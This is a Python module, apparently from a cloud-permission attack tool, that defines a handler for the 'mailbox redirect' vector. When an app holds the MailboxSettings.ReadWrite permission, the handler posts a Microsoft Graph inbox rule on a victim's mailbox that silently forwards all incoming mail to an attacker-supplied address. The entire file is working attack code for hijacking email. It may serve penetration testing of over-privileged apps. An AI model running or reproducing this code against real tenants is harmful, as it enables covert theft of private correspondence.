from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.mailboxRedirect_handler')


class MailboxRedirect_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "MailboxSettings.ReadWrite" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to mailbox_redirect vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "MailboxSettingsRedirectVectors"
            message = ""
            error = "MailboxSettingsRedirectVectors - failed"
            conf = request.attack_config['mailbox']
            logger.debug("MailboxSettings.ReadWrite - Allows the app to create, read, update, and delete user's mailbox settings without a signed-in user.")

            logger.debug("Attack vector - mails redirection.")
            try:
                create_message_URL = "https://graph.microsoft.com/v1.0/users/" + conf["readingVictim"] + "/mailFolders/inbox/messageRules"
                body = {
                    "displayName": "From PermissionPanic",
                    "sequence": 2,
                    "isEnabled": "true",
                    "conditions": {
                        "isVoicemail": "false",
                    },
                    "actions": {
                        "forwardTo": [
                        {
                            "emailAddress": {
                                "name": "attacker",
                                "address": conf["attacker"]
                            }
                        }
                        ],
                        "stopProcessingRules": "true"
                    }
                }
                result = requests.post(create_message_URL, json=body, headers=request.request_headers)
                if result.status_code == 201:
                    message += "set rule to send mails from %s to %s.   \n" % (conf["readingVictim"],conf["attacker"])
                    status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in mailboxRedirect_handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
